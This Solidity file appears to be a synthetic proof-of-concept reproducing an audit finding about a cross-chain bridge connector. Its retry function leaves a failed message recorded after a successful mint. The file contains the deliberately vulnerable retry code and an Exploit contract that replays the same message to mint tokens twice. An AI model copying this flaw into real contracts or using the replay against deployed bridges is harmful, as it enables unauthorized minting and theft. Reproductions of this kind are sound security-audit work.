// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*
    LMCV — failed Hyperlane messages can be replayed (Halborn, #50682).
    Synthetic, local-only reproduction. A retry succeeds but leaves its failed
    message recorded, so the exact same bridge message mints again on each retry.
*/

contract DPrime {
    mapping(address => uint256) public balanceOf;

    function mint(address recipient, uint256 amount) external {
        balanceOf[recipient] += amount;
    }
}

interface DPrimeLike {
    function mint(address recipient, uint256 amount) external;
}

contract DPrimeConnectorHyperlane {
    DPrime public immutable dPrimeContract;
    mapping(uint32 => mapping(address => mapping(uint256 => uint256))) public failedMessages;

    event ReceivedTransferRemote(uint32 origin, address recipient, uint256 amount);
    event FailedTransferRemote(uint32 origin, address recipient, uint256 nonce, uint256 amount);

    constructor(DPrime token) {
        dPrimeContract = token;
    }

    function recordFailedMessage(uint32 origin, address recipient, uint256 nonce, uint256 amount) external {
        failedMessages[origin][recipient][nonce] = amount;
    }

    function retry(uint32 _origin, address _recipient, uint256 _nonce) external {
        uint256 amount = failedMessages[_origin][_recipient][_nonce];

        // The audited implementation's retry body is preserved verbatim.
        try DPrimeLike(address(dPrimeContract)).mint(_recipient, amount) {
            // @> VULN: no `delete failedMessages[_origin][_recipient][_nonce]` after successful mint.
            // FIX: delete the failed-message entry before (or atomically with) the successful retry.
            emit ReceivedTransferRemote(_origin, _recipient, amount);
        } catch {
            emit FailedTransferRemote(_origin, _recipient, _nonce, amount);
        }
    }
}

contract Exploit {
    uint32 public constant ORIGIN = 10;
    uint256 public constant NONCE = 77;
    uint256 public constant AMOUNT = 100;

    DPrime public token; // CREATE nonce 1
    DPrimeConnectorHyperlane public connector; // CREATE nonce 2 (vulnerable)

    constructor() {
        token = new DPrime();
        connector = new DPrimeConnectorHyperlane(token);
    }

    function run() external {
        connector.recordFailedMessage(ORIGIN, address(this), NONCE, AMOUNT);

        connector.retry(ORIGIN, address(this), NONCE);
        uint256 afterFirstRetry = token.balanceOf(address(this));

        connector.retry(ORIGIN, address(this), NONCE);
        uint256 afterSecondRetry = token.balanceOf(address(this));

        require(afterFirstRetry == AMOUNT, "first retry did not mint");
        require(afterSecondRetry == AMOUNT * 2, "failed message was not replayed");
        require(
            connector.failedMessages(ORIGIN, address(this), NONCE) == AMOUNT,
            "message should have been deleted after success"
        );
    }
}
